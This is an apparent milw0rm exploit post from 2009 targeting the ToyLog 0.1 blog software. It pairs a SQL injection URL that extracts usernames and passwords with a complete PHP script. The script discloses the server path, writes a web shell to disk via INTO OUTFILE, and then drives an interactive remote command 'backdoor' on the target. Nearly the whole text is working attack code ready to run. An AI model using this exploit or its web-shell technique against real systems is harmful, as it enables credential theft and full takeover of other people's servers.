<html><head><title>ToyLog 0.1 SQL Injection Vulnerability/RCE Exploit</title></head><pre>--+++=====================================================================================+++--
--+++====== ToyLog 0.1 SQL Injection Vulnerability/Remote Command Execution Exploit ======+++--
--+++=====================================================================================+++--

[+] SQL Injection Vulnerability
Url: http://localhost/ToyLog/read.php?idm=1%20UNION%20ALL%20SELECT%201,username,password,4%20FROM%20user

[+] Remote Command Execution Exploit

#!/usr/bin/php
&lt;?php

function usage () {
	exit (	&quot;\n&quot;.
		&quot;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n&quot;.
		&quot;-                                                   -\n&quot;.
		&quot;+ ToyLog 0.1 Remote Command Execution Exploit       +\n&quot;.
		&quot;- Author  : darkjoker                               -\n&quot;.
		&quot;+ Site    : http://darkjoker.net23.net              +\n&quot;.
		&quot;- Download: http://sourceforge.net/projects/toylog/ -\n&quot;.
		&quot;+ Usage   : php xpl.php &lt;url&gt;                       +\n&quot;.
		&quot;- Ex.     : php xpl.php http://localhost/ToyLog/    -\n&quot;.
		&quot;+                                                   +\n&quot;.
		&quot;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\n&quot;.
		&quot;\n&quot;);
}

function hex_format ($string) {
	$i=0;
	while ($i&lt;strlen($string)) 
		$hex .= &quot;%&quot;.dechex(ord($string[$i++]));
	return $hex;
}

function get_path ($host, $dir) {
	$fp = fsockopen ($host, 80);
	$query = hex_format (&quot;1 UNION ALL SELECT * FROM does_not_exist&quot;);
	$req =	&quot;GET {$dir}read.php?idm={$query} HTTP/1.1\r\n&quot;.
		&quot;Host: {$host}\r\n&quot;.
		&quot;Connection: Close\r\n\r\n&quot;;
	fputs ($fp, $req);
	while (!feof ($fp)) 
		if (preg_match (&quot;|resource in &lt;b&gt;(.+?)&lt;/b&gt; on|&quot;, fgets ($fp, 1024), $data))
			$path = $data [1];
	list ($path) = explode (&quot;block/db.php&quot;, $path);
	fclose ($fp);
	return $path;
}

function upload_shell ($host, $dir) {
	$fp = fsockopen ($host, 80);
	$shell_path = get_path ($host, $dir).&quot;shell.php&quot;;
	if (!strcmp ($shell_path, &quot;shell.php&quot;))
		die (&quot;[-] Exploit failed.\n&quot;);
	$query = hex_format('1 UNION ALL SELECT 1,2,\'xxx&lt;?php system (stripslashes($_GET[\\\'cmd\\\'])); ?&gt;xxx\',4 INTO OUTFILE \''.$shell_path.'\' FROM post');
	$req =	&quot;GET {$dir}read.php?idm={$query} HTTP/1.1\r\n&quot;.
		&quot;Host: {$host}\r\n&quot;.
		&quot;Connection: Close\r\n\r\n&quot;;
	fputs ($fp, $req);
	fclose ($fp);
}

if (!preg_match (&quot;|http://(.+?)(/.+/)|&quot;, $argv [1], $data))
	usage ();
array_shift ($data);
list ($host, $dir) = $data;
upload_shell ($host, $dir);
$stdin = fopen (&quot;php://stdin&quot;, &quot;r&quot;);
while (1) {
	echo &quot;backdoor@{$host}: &quot;;
	$cmd = hex_format(trim (fgets ($stdin, 1024)));
	if (!strcmp ($cmd, hex_format(&quot;exit&quot;)))
		break;
	$out = explode (&quot;xxx&quot;, file_get_contents (&quot;http://{$host}{$dir}shell.php?cmd={$cmd}&quot;));
	array_shift ($out);
	array_pop ($out);
	echo $out [0];
}

?&gt;

# milw0rm.com [2009-07-10]</pre></html>